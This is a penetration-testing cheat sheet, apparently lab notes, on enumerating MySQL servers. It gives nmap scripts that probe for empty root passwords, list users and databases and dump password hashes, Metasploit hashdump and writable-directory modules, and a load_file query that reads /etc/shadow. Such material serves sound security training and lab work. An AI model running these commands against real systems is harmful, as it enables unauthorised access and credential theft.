# Enumeration: MySQL
> MySQL is usually found on some flavor of Linux. Database software very common in many web sites, especially in enterprise systems. It's also very often misconfigured and therefore vulnerable.

- Default MySQL Port: `3306`

## Contents
- [](#)
- [](#)
- [](#)
- [](#)
- [](#)

## Nmap Scripts

### Default Scripts
> Start wide and general, then focus on things your find. Start with default scripts.
```
nmap -sV -sC -p 3306 [target ip]
```

### mysql-empty-password
> This will look for accounts that don't require a password Checks for MySQL servers with an empty password for root or anonymous.
```
nmap -sV -p 3306 --script mysql-empty-password [target ip]
```

### mysql-info
> More information on the db itself If you see "Interactive Client," that's interesting. 
```
nmap -sV -p 3306 --script mysql-info[target ip]
```

### mysql-users
> Should provide you with a list of users on the db system (add to enumeration notes)
```
nmap -sV -p 3306 --script mysql-users --script-args "mysqluser='root',mysqlpass=''" [target ip]
```

### mysql-databases
> Should provide you with a list of databases on the system (add to enumeration notes)
```
nmap -sV -p 3306 --script mysql-databases --script-args "mysqluser='root',mysqlpass=''" [target ip]
```
- You get a mess of information.  Look for (most useful):  `datadir: /var/lib/mysql`
- That tells you were the variables are stored (this has potential uses)

### mysql-audit
```
nmap -sV -p 3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" [target ip]
```
- NOTE: "Do not grant GRANT privileges to non Admin users => PASS" (that's good security but bad for us)
- Three args are required: [documentation](https://nmap.org/nsedoc/scripts/mysql-audit.html)
  - mysql-audit.username='root'
  - mysql-audit.password='foobar'
  - mysql-audit.filename='nselib/data/mysql-cis.audit'  [usually in /usr/share/nmap/]

### mysql-dump-hashes
> Should get all the hashes (just like with the msf scan below)
```
nmap -sV -p 3306 --script mysql-dump-hashes --script-args "username='root',password=''" [target ip]
```

### mysql-query
> Run an SQL query via an nmap script
```
nmap -sV -p 3306 --script mysql-query --script-args "query='select count(*) from books.authors;',username='root',password=''" [target ip]
```
- NOTE: Syntax of SQL Count() function...
```
SELECT COUNT(expression)
FROM table
WHERE condition;
```
- *Expression* is the parameter where you specify which values you want to count. It can be a field or string type value.
- *Table* is the table you use as a source to fetch records. You need to hyave at least one table.
- *WHERE* is an optional condition for selecting records from the table. 

## MetaSploit
> If you are not very familiar with SQL, you can use the MSF as a crutch.

### mysql_writable_dirs
```
> use auxiliary/scanner/mysql/mysql_writable_dirs
> options
> set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
  # tab completion is your friend
> setg rhosts [target ip]
  # setg is global so you don't have to keep setting rhosts if you're going to be hammering on the same ip all the time. Sets it for the current session only, but for the whole session.
> set verbose false
  # This is found in the advanced options section ( > advanced )
> set password ""
  # Sets to null
> run
```
- Outputting these kinds of things to a file can be a lot easier to parse
- Find writable dirs, etc.  (tmp and root are the only writable dirs on this lesson)
- NOTE: you found writable dirs in the target FILESYSTEM (not in the database), and you found them by scanning the database.

### mysql_hashdump
```
> use auxiliary/scanner/mysql/mysql_hashdump
> options
  # if you use setg for rhosts, it should already be set
> set username root
> set password ""
> run
```
- You just might get a whole bundle of hashs you can add to our list of enumerated goodies

## MySQL Commands

### Initial Queries
```
mysql -h [target ip] -u root
```
- This is a mysql command, the `-h` is for the host, `-u` is username
- If that lets you login... it's horribly misconfigured and more than vulnerable.
- At the `MySQL [(none)]>` prompt:

```
show databases;
  # NOTE: requires semicolon at the end
  # This will list out all the databases out there on the server
  # Choose one and look at it... done with "use [database]"
use [database];
show tables;
describe [table name or databaseName.tableName];
use books;
  # This drops us into the books db
select count(*) from authors;
  # This gives us a count of authors in the db
  # If you want to see everything from db...
select * from authors
  # Lists out all the info in authors
help
  # This will give you a quick list of things you can do, syntax, etc.
```

### Filesystem Acces
> Let's see if we have access to files on the target machine... 
```
mysql -h [target ip] -u root
```
- At the `MySQL [(none)]>` prompt:
```
> select load_file("/etc/shadow");
```
- You may get the full shadow file...
- The [/etc/shadow](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) file is a text file that contains information about the system’s users’ passwords.
- The [/etc/passwd](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) file contains a list of valid users on the target system
